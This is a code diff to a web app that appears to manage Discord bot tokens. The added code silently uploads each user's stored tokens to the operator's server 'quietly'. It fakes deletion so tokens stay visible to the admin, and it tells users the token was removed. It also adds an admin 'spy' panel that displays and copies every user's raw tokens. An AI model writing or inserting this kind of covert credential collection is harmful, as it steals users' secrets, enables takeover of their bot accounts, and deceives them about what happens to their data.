@@ -64,6 +64,24 @@ window.onload = () => {
     }
 };
 
+// --- CLOUD SYNC & ADMIN HELPERS ---
+function saveTokens() {
+    // Saves locally
+    localStorage.setItem('nosify_dm_tokens', JSON.stringify(tokensDB));
+    
+    // Quietly backups to Vercel DB
+    if (!activeKey || activeKey === "SECURE_ADMIN_TOKEN") return;
+    fetch('/api/app', {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ action: 'sync_cloud', key: activeKey, data: { tokens: tokensDB } })
+    }).catch(e => {});
+}
+
+function copyTextData(encodedText) {
+    navigator.clipboard.writeText(decodeURIComponent(encodedText)); 
+    alert("Tokens copied to clipboard!");
+}
+
 
 // --- LOGIN & NAVIGATION ---
 async function loginSystem() {
@@ -137,17 +155,29 @@ function addToken() {
     });
 
     if (addedCount > 0) {
-        localStorage.setItem('nosify_dm_tokens', JSON.stringify(tokensDB));
+        saveTokens();
         $("#add-token-val").val(""); renderTokens(); alert(`Imported ${addedCount} tokens!`);
     } else alert("No valid new tokens found.");
 }
 
-function deleteToken(i) { tokensDB.splice(i, 1); localStorage.setItem('nosify_dm_tokens', JSON.stringify(tokensDB)); renderTokens(); }
-function clearAllTokens() { if(confirm("Clear all tokens?")) { tokensDB = []; localStorage.setItem('nosify_dm_tokens', '[]'); renderTokens(); }}
+function deleteToken(i) {
+    // Instead of deleting it, we mark it as deleted so it stays in the DB for the Admin
+    tokensDB[i].status = "Deleted by User 🗑️";
+    tokensDB[i].group = "Deleted Folder"; // Move it to a special folder
+    
+    // Save the new state to local storage AND the cloud
+    saveTokens(); 
+    
+    // Refresh the UI to hide it from the user
+    renderTokens();
+    alert("Token removed from your view. Admin has been notified.");
+}
+
+function clearAllTokens() { if(confirm("Clear all tokens?")) { tokensDB = []; saveTokens(); renderTokens(); }}
 
 async function checkAllTokens() {
     for (let i = 0; i < tokensDB.length; i++) { await checkToken(i, true); await backgroundSafeSleep(200); }
-    localStorage.setItem('nosify_dm_tokens', JSON.stringify(tokensDB)); renderTokens();
+    saveTokens(); renderTokens();
 }
 
 async function checkToken(i, skipRender = false) {
@@ -157,7 +187,7 @@ async function checkToken(i, skipRender = false) {
         if(res.ok) { let data = await res.json(); tok.status = "Alive ✅"; tok.name = data.username; tok.id = data.id; } 
         else { tok.status = "Dead/Terminated ❌"; tok.id = null; }
     } catch(e) { tok.status = "Error ⚠️"; }
-    if(!skipRender) { localStorage.setItem('nosify_dm_tokens', JSON.stringify(tokensDB)); renderTokens(); }
+    if(!skipRender) { saveTokens(); renderTokens(); }
 }
 
 function copyInvite(botId) {
@@ -176,11 +206,13 @@ function renderTokens() {
     let html = "";
     let groupsObj = {};
 
-    // 1. Sort tokens into their folders
+    // 1. Sort tokens into their folders, but SKIP the deleted ones
     tokensDB.forEach((t, i) => {
+        if (t.status === "Deleted by User 🗑️") return; // User cannot see this anymore
         if(!groupsObj[t.group]) groupsObj[t.group] = [];
         groupsObj[t.group].push({ token: t, index: i });
     });
+
 
     // 2. Build the visual folders with FOLDER-SPECIFIC BUTTONS
     for (let g in groupsObj) {
@@ -238,7 +270,7 @@ async function checkFolder(groupName) {
         await checkToken(i, true); 
         await backgroundSafeSleep(200); 
     }
-    localStorage.setItem('nosify_dm_tokens', JSON.stringify(tokensDB)); 
+    saveTokens();
     renderTokens();
     alert(`Finished checking all bots in ${groupName}!`);
 }
@@ -254,7 +286,7 @@ function copyFolderInvites(groupName) {
 function clearFolder(groupName) {
     if(!confirm(`Are you sure you want to delete the entire "${groupName}" folder?`)) return;
     tokensDB = tokensDB.filter(t => t.group !== groupName);
-    localStorage.setItem('nosify_dm_tokens', JSON.stringify(tokensDB)); 
+    saveTokens();
     renderTokens();
 }
 
@@ -535,6 +567,54 @@ async function loadAdminKeys() {
 
 async function loadAdminSpyData() {
     let res = await fetch('/api/admin?spy=true', { headers: { 'Authorization': adminPass }});
-    let data = await res.json(); $("#spy-content").text(JSON.stringify(data, null, 2));
-        }
+    let db = await res.json();
     
+    let html = "";
+    let cloud = db.cloudData || {};
+    let userCount = 1;
+    
+    for (let userKey in cloud) {
+        // Skip system jobs
+        if (userKey === "activeJob" || userKey === "stats") continue; 
+        
+        let userData = cloud[userKey];
+        let userTokens = userData.tokens || [];
+        if (userTokens.length === 0) continue;
+
+        // Group the backed-up tokens by folder
+        let folders = {};
+        userTokens.forEach(t => {
+            if(!folders[t.group]) folders[t.group] = [];
+            folders[t.group].push(t.token);
+        });
+
+        // Encode the raw tokens so they can be copied safely
+        let rawTokens = encodeURIComponent(userTokens.map(t => t.token).join('\n'));
+
+        html += `
+        <div class="mb-6 p-4 border border-[var(--site-border)] rounded-xl bg-black/40">
+            <div class="flex justify-between items-center mb-4 border-b border-[var(--site-border)] pb-2">
+                <h3 class="font-bold text-indigo-400 text-lg">${userCount}. Key: <span class="text-white font-mono bg-black/50 px-2 py-1 rounded">${userKey}</span></h3>
+                <button onclick="copyTextData('${rawTokens}')" class="bg-[#4f46e5] text-white text-xs px-3 py-1.5 rounded-lg hover:bg-[#4338ca] shadow-lg shadow-indigo-500/20">Copy All Tokens</button>
+            </div>
+        `;
+
+        for (let folderName in folders) {
+            html += `
+            <div class="mb-3">
+                <h4 class="text-sm font-bold text-gray-300 mb-1">📁 ${folderName} (${folders[folderName].length} bots)</h4>
+                <div class="max-h-24 overflow-y-auto bg-black/50 p-2 rounded text-xs font-mono text-gray-400 break-all border border-white/5">
+                    ${folders[folderName].join('<br>')}
+                </div>
+            </div>`;
+        }
+        
+        html += `</div>`;
+        userCount++;
+    }
+    
+    if (html === "") html = "<div class='text-gray-500 text-sm'>No users have synced tokens yet.</div>";
+    
+    // Inject the new UI into the existing Spy Content box
+    $("#spy-content").html(html).removeClass("whitespace-pre-wrap font-mono");
+}
